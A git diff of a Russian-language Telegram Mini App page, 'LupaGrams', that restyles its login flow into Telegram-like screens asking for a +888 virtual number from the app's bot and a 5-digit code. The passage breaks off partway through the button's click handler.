@@ -1,124 +1,310 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>LupaGrams</title>
-<style>
-:root{--bg:#0e1621;--sec:#17212b;--hov:#202b36;--out:#2b5278;--in:#182533;--acc:#2ea6ff;--txt:#f5f5f5;--sub:#7f91a4;--brd:#101921;--on:#4dcd5e}
-*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
-body{background:var(--bg);color:var(--txt);height:100vh;overflow:hidden;user-select:none}
-.screen{display:none;flex-direction:column;height:100vh;width:100%;position:absolute;inset:0;background:var(--bg)}
-.screen.active{display:flex}
-.auth{margin:auto;width:88%;max-width:360px;text-align:center}
-.logo{width:96px;height:96px;background:linear-gradient(135deg,#37aee2,#1e96c8);border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 24px rgba(46,166,255,.25)}
-.logo svg{width:50px;height:50px;fill:#fff;margin-right:4px}
-.title{font-size:22px;font-weight:600;margin-bottom:10px}
-.desc{font-size:14px;color:var(--sub);line-height:1.45;margin-bottom:28px}
-.igrp{position:relative;margin-bottom:20px;text-align:left}
-.ilbl{position:absolute;top:-8px;left:12px;background:var(--bg);padding:0 6px;font-size:12px;color:var(--acc)}
-.inp{width:100%;padding:15px 16px;background:transparent;border:2px solid var(--acc);border-radius:12px;color:#fff;font-size:17px;outline:none}
-.btn{width:100%;padding:15px;background:var(--acc);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
-.btn:active{opacity:.8}
-.hdr{background:var(--sec);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--brd);z-index:10}
-.hl{display:flex;align-items:center;gap:16px}
-.ibtn{background:none;border:none;color:var(--txt);cursor:pointer;display:flex;align-items:center;padding:4px}
-.htit{font-size:19px;font-weight:600}
-.tabs{background:var(--sec);display:flex;padding:0 12px;border-bottom:1px solid var(--brd)}
-.tab{padding:11px 16px;font-size:14px;font-weight:600;color:var(--sub);border-bottom:3px solid transparent;cursor:pointer}
-.tab.active{color:var(--acc);border-bottom-color:var(--acc)}
-.clist{flex:1;overflow-y:auto;background:var(--bg)}
-.citem{display:flex;align-items:center;padding:10px 14px;gap:13px;cursor:pointer;border-bottom:1px solid rgba(16,25,33,.5)}
-.citem:active{background:var(--hov)}
-.av{width:52px;height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:600;color:#fff;flex-shrink:0;position:relative}
-.dot{width:13px;height:13px;background:var(--on);border:2px solid var(--bg);border-radius:50%;position:absolute;bottom:1px;right:1px}
-.cinf{flex:1;min-width:0}
-.ctop{display:flex;justify-content:space-between;margin-bottom:4px}
-.cname{font-size:16px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.ctime{font-size:12px;color:var(--sub)}
-.cprev{font-size:14px;color:var(--sub);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.fab{position:fixed;bottom:22px;right:20px;width:56px;height:56px;border-radius:50%;background:var(--acc);color:#fff;border:none;box-shadow:0 4px 14px rgba(0,0,0,.4);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:5}
-.ovl{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:50}
-.ovl.open{display:block}
-.drw{position:fixed;top:0;left:-280px;width:275px;height:100%;background:var(--sec);z-index:51;transition:left .25s;display:flex;flex-direction:column}
-.drw.open{left:0}
-.dhdr{background:#1d2a38;padding:24px 18px 16px}
-.dname{font-size:16px;font-weight:600;margin-top:14px}
-.dph{font-size:13px;color:var(--sub);margin-top:3px}
-.ditem{display:flex;align-items:center;gap:20px;padding:14px 20px;font-size:15px;cursor:pointer}
-.ditem:active{background:var(--hov)}
-.marea{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;background:#0e1621}
-.msg{max-width:80%;padding:8px 12px;border-radius:14px;font-size:15px;line-height:1.4;word-wrap:break-word}
-.msg.in{align-self:flex-start;background:var(--in);border-bottom-left-radius:4px}
-.msg.out{align-self:flex-end;background:var(--out);border-bottom-right-radius:4px}
-.mmeta{display:flex;align-items:center;justify-content:flex-end;gap:4px;font-size:11px;color:rgba(255,255,255,.55);margin-top:3px}
-.ibar{background:var(--sec);padding:8px 10px;display:flex;align-items:center;gap:8px;border-top:1px solid var(--brd)}
-.minp{flex:1;background:transparent;border:none;color:#fff;font-size:16px;padding:8px;outline:none}
-.sbtn{width:40px;height:40px;border-radius:50%;background:var(--acc);border:none;color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer}
-.sbox{display:none;padding:8px 14px;background:var(--sec)}
-.sbox.active{display:block}
-.sinp{width:100%;background:var(--bg);border:none;padding:9px 14px;border-radius:20px;color:#fff;outline:none;font-size:14px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LupaGrams</title>
+    <script src="https://telegram.org"></script>
+    <style>
+        :root {
+            --bg-color: #17212b;
+            --text-color: #ffffff;
+            --hint-color: #8b9bb4;
+            --accent-color: #2ea6ff;
+            --accent-hover: #2593e6;
+            --error-color: #e53935;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
+            overflow-x: hidden;
+        }
+
+        .screen {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            transition: opacity 0.25s ease, transform 0.25s ease;
+        }
+
+        .screen.hidden {
+            display: none;
+            opacity: 0;
+        }
+
+        /* Фирменная иконка */
+        .logo-circle {
+            width: 112px;
+            height: 112px;
+            background-color: var(--accent-color);
+            border-radius: 50%;
+            margin: 0 auto 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(46, 166, 255, 0.2);
+        }
+
+        .logo-circle svg {
+            width: 58px;
+            height: 58px;
+            fill: #ffffff;
+            transform: translateX(-2px);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            color: var(--hint-color);
+            font-size: 14px;
+            line-height: 1.45;
+            margin-bottom: 32px;
+        }
+
+        .subtitle span {
+            color: var(--text-color);
+            font-weight: 500;
+        }
+
+        /* Поле ввода в стиле Telegram */
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .input-label {
+            position: absolute;
+            top: -8px;
+            left: 12px;
+            background-color: var(--bg-color);
+            padding: 0 6px;
+            font-size: 12px;
+            color: var(--accent-color);
+            font-weight: 500;
+            transition: color 0.2s;
+            z-index: 2;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 0 16px;
+            background-color: transparent;
+            border: 2px solid var(--accent-color);
+            border-radius: 12px;
+            color: var(--text-color);
+            font-size: 17px;
+            font-weight: 400;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #52b7ff;
+        }
+
+        .input-wrapper.error .input-field {
+            border-color: var(--error-color);
+            animation: shake 0.35s ease;
+        }
+
+        .input-wrapper.error .input-label {
+            color: var(--error-color);
+        }
+
+        /* Кнопка Продолжить */
+        .tg-button {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            height: 50px;
+            background-color: var(--accent-color);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.15s, transform 0.1s;
+            user-select: none;
+        }
+
+        .tg-button:hover {
+            background-color: var(--accent-hover);
+        }
+
+        .tg-button:active {
+            transform: scale(0.98);
+        }
+
+        .tg-button:disabled {
+            opacity: 0.7;
+            cursor: default;
+            transform: none;
+        }
+
+        /* Кружок загрузки как в Telegram */
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 2.5px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .tg-button.loading .btn-label {
+            display: none;
+        }
+
+        .tg-button.loading .spinner {
+            display: block;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-top: 20px;
+            color: var(--accent-color);
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+    </style>
 </head>
 <body>
 
-<div id="s-auth" class="screen active">
-  <div class="auth">
-    <div class="logo"><svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg></div>
-    <div class="title">LupaGrams</div>
-    <div class="desc">Введите виртуальный номер из бота <b>@LupaGrams_bot</b></div>
-    <div class="igrp"><span class="ilbl">Номер телефона</span><input type="tel" id="ph" class="inp" value="+888 435 5226"></div>
-    <button type="button" class="btn" onclick="goCode()">Продолжить</button>
-  </div>
-</div>
+    <!-- ЭКРАН 1: Ввод номера -->
+    <div class="screen" id="screen-phone">
+        <div class="logo-circle">
+            <svg viewBox="0 0 24 24">
+                <path d="M20.665 3.717l-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.282-1.434z"/>
+            </svg>
+        </div>
 
-<div id="s-code" class="screen">
-  <div class="auth">
-    <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
-    <div class="title" id="d-ph">+888 435 5226</div>
-    <div class="desc">Введите любые 5 цифр кода подтверждения</div>
-    <div class="igrp"><span class="ilbl">Код из бота</span><input type="number" id="cd" class="inp" placeholder="12345" style="text-align:center;letter-spacing:6px;font-size:22px"></div>
-    <button type="button" class="btn" onclick="login()">Войти в LupaGrams</button>
-  </div>
-</div>
+        <h1>LupaGrams</h1>
+        <p class="subtitle">Введите виртуальный номер из бота<br><span>@LupaGrams_bot</span></p>
 
-<div id="s-main" class="screen">
-  <div class="hdr">
-    <div class="hl">
-      <button type="button" class="ibtn" onclick="drw(true)"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></button>
-      <div class="htit">LupaGrams</div>
+        <div class="input-wrapper" id="phone-group">
+            <label class="input-label" for="phone-input">Номер телефона</label>
+            <input type="tel" class="input-field" id="phone-input" value="+888 " autocomplete="off">
+        </div>
+
+        <button type="button" class="tg-button" id="btn-continue">
+            <span class="btn-label">Продолжить</span>
+            <div class="spinner"></div>
+        </button>
     </div>
-    <button type="button" class="ibtn" onclick="srch()"><svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
-  </div>
-  <div class="sbox" id="sbox"><input type="text" class="sinp" id="sinp" placeholder="Поиск чатов..." oninput="rChats()"></div>
-  <div class="tabs">
-    <div class="tab active" onclick="sTab('all',this)">Все</div>
-    <div class="tab" onclick="sTab('personal',this)">Личные</div>
-    <div class="tab" onclick="sTab('bots',this)">Боты</div>
-  </div>
-  <div class="clist" id="clist"></div>
-  <button type="button" class="fab" onclick="newChat()"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a.996.996 0 0 0 0-1.41l-2.34-2.34a.996.996 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg></button>
-</div>
 
-<div id="s-chat" class="screen">
-  <div class="hdr">
-    <div class="hl" style="gap:12px">
-      <button type="button" class="ibtn" onclick="cChat()"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button>
-      <div class="av" id="cav" style="width:40px;height:40px;font-size:16px">L</div>
-      <div><div class="htit" id="ctit" style="font-size:17px">Имя</div><div style="font-size:12px;color:var(--acc)" id="cst">в сети</div></div>
+    <!-- ЭКРАН 2: Ввод кода подтверждения -->
+    <div class="screen hidden" id="screen-code">
+        <div class="logo-circle">
+            <svg viewBox="0 0 24 24">
+                <path d="M20.665 3.717l-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.282-1.434z"/>
+            </svg>
+        </div>
+
+        <h1 id="display-phone">+888 000 0000</h1>
+        <p class="subtitle">Мы отправили код подтверждения в бот <span>@LupaGrams_bot</span></p>
+
+        <div class="input-wrapper" id="code-group">
+            <label class="input-label" for="code-input">Код</label>
+            <input type="text" inputmode="numeric" maxlength="5" class="input-field" id="code-input" placeholder="12345" autocomplete="off">
+        </div>
+
+        <button type="button" class="tg-button" id="btn-verify">
+            <span class="btn-label">Войти</span>
+            <div class="spinner"></div>
+        </button>
+
+        <a class="back-link" id="btn-back">Изменить номер</a>
     </div>
-  </div>
-  <div class="marea" id="marea"></div>
-  <div class="ibar">
-    <button type="button" class="ibtn" style="color:var(--sub)" onclick="emo()"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z"/></svg></button>
-    <input type="text" id="minp" class="minp" placeholder="Сообщение..." onkeypress="if(event.key==='Enter') send()">
-    <button type="button" class="sbtn" onclick="send()"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg></button>
-  </div>
-</div>
 
-<div class="ovl" id="ovl" onclick="drw(false)"></div>
-<div class="drw" id="drw">
-  <div class="dhdr">
-    <div class="av" style="background:#2ea6ff;width:58px;height:58px;font-size:22px">Я</div>
-    <div class="dname">Пользователь LupaGrams</div>
-  
+    <script>
+        // Инициализация Telegram Web App (если открыто внутри ТГ)
+        if (window.Telegram && window.Telegram.WebApp) {
+            const tg = window.Telegram.WebApp;
+            tg.ready();
+            tg.expand();
+            tg.setHeaderColor('#17212b');
+            tg.setBackgroundColor('#17212b');
+        }
+
+        const phoneInput = document.getElementById('phone-input');
+        const phoneGroup = document.getElementById('phone-group');
+        const btnContinue = document.getElementById('btn-continue');
+
+        const codeInput = document.getElementById('code-input');
+        const codeGroup = document.getElementById('code-group');
+        const btnVerify = document.getElementById('btn-verify');
+        const btnBack = document.getElementById('btn-back');
+
+        const screenPhone = document.getElementById('screen-phone');
+        const screenCode = document.getElementById('screen-code');
+        const displayPhone = document.getElementById('display-phone');
+
+        // Автоматическое форматирование номера (+888 XXX XXXX)
+        phoneInput.addEventListener('input', function(e) {
+            phoneGroup.classList.remove('error');
+            let digits = this.value.replace(/\D/g, '');
+            
+            if (!digits.startsWith('888')) {
+                digits = '888' + digits.replace(/^8+/, '');
+            }
+            digits = digits.substring(0, 10);
+
+            let formatted = '+888';
+            if (digits.length > 3) {
+                formatted += ' ' + digits.substring(3, 6);
+            }
+            if (digits.length > 6) {
+                formatted += ' ' + digits.substring(6, 10);
+            }
+            this.value = formatted;
+        });
+
+        // Нажатие на кнопку "Продолжить"
+        btnContinue.addEventListener('click', function() {
+            const digits = phoneInput.value.replace(/\D/g, '');
+
+            // Проверка, что номер введен полностью (10 цифр вместе с 888)
+            if (digits.length < 10) {
+                phoneGroup.classList.add('error');
+                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.HapticFeedback) {
+                    window.Telegram.WebApp.HapticFeedback.notificationOccurred('error');
+                }
+      
